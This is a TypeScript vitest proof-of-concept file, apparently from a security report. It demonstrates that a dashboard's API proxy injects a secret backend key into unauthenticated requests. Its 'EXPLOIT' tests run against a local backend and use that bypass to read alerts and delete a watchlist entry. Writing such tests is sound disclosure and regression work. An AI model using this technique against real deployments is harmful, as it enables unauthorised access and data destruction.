/**
 * PoC — NEXUS dashboard proxy confused-deputy auth bypass.
 *
 * Vulnerable file: apps/dashboard/app/api/nexus/[...path]/route.ts
 *
 * The proxy attaches the server-only NEXUS_API_KEY to EVERY request it
 * forwards, without authenticating the caller. docker-compose publishes the
 * dashboard on :3000, so any unprivileged network attacker who can reach the
 * dashboard reaches every NEXUS_API_KEY-gated backend endpoint — including the
 * destructive DELETE /watchlists/{id} — with no credentials of their own.
 *
 * This test drives the REAL proxy route against the REAL FastAPI backend
 * (apps/api/main.py, started by security/proxy-auth-bypass/fake_api.py with an
 * in-memory store so no Postgres is needed; only the DB connection is faked,
 * auth + routes are untouched production code).
 */
import { spawn, ChildProcess } from "node:child_process";
import { resolve } from "node:path";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
// The real, unmodified vulnerable proxy route:
import { DELETE, GET } from "../app/api/nexus/[...path]/route";
import { NextRequest } from "next/server";

const API_PORT = 8111;
const API_URL = `http://127.0.0.1:${API_PORT}`;
const SERVER_KEY = "s3cret-poc-key";
let api: ChildProcess;

async function waitForApi() {
  for (let i = 0; i < 50; i++) {
    try {
      const r = await fetch(`${API_URL}/health`);
      if (r.ok) return;
    } catch {}
    await new Promise((res) => setTimeout(res, 200));
  }
  throw new Error("API did not start");
}

beforeAll(async () => {
  // The proxy reads these on the server; the browser/attacker never sees them.
  process.env.NEXUS_API_URL = API_URL;
  process.env.NEXUS_API_KEY = SERVER_KEY;
  // cwd is apps/dashboard when run via `npx vitest run` from there.
  const venvPy = resolve(process.cwd(), "../api/.venv/bin/python");
  const script = resolve(process.cwd(), "../../security/proxy-auth-bypass/fake_api.py");
  api = spawn(venvPy, [script], {
    env: { ...process.env, NEXUS_API_KEY: SERVER_KEY, POC_API_PORT: String(API_PORT) },
    stdio: "inherit",
  });
  await waitForApi();
}, 30000);

afterAll(() => { api?.kill("SIGKILL"); });

// Build a request exactly as an unauthenticated browser/attacker would send:
// NO X-Api-Key, no cookie, no credential of any kind.
function attackerReq(method: string, path: string) {
  return new NextRequest(`http://dashboard.example${path}`, { method });
}

describe("dashboard proxy confused-deputy auth bypass", () => {
  it("CONTROL: the backend endpoint is genuinely key-gated (401 without a key)", async () => {
    const direct = await fetch(`${API_URL}/watchlists`);
    expect(direct.status).toBe(401); // attacker hitting the API directly is blocked
  });

  it("EXPLOIT: unauthenticated attacker reads a key-gated endpoint via the proxy", async () => {
    const res = await GET(attackerReq("GET", "/alerts?limit=5"), {
      params: { path: ["alerts"] },
    } as any);
    // Proxy injected the secret key, so the attacker gets 200 (not 401).
    expect(res.status).toBe(200);
  });

  it("EXPLOIT: unauthenticated attacker DELETEs a monitored watchlist entry via the proxy", async () => {
    // Confirm target exists (read through the proxy — also unauthenticated).
    const before = await GET(attackerReq("GET", "/watchlists"), {
      params: { path: ["watchlists"] },
    } as any);
    const beforeBody = await before.json();
    expect(beforeBody.some((w: any) => w.id === 1)).toBe(true);

    // The attack: destructive mutation with zero credentials.
    const res = await DELETE(attackerReq("DELETE", "/watchlists/1"), {
      params: { path: ["watchlists", "1"] },
    } as any);
    expect(res.status).toBe(200);
    expect(await res.json()).toEqual({ deleted: 1 });

    // The monitored target is gone from the real backend.
    const after = await GET(attackerReq("GET", "/watchlists"), {
      params: { path: ["watchlists"] },
    } as any);
    expect(await after.json()).toEqual([]);
  });
});
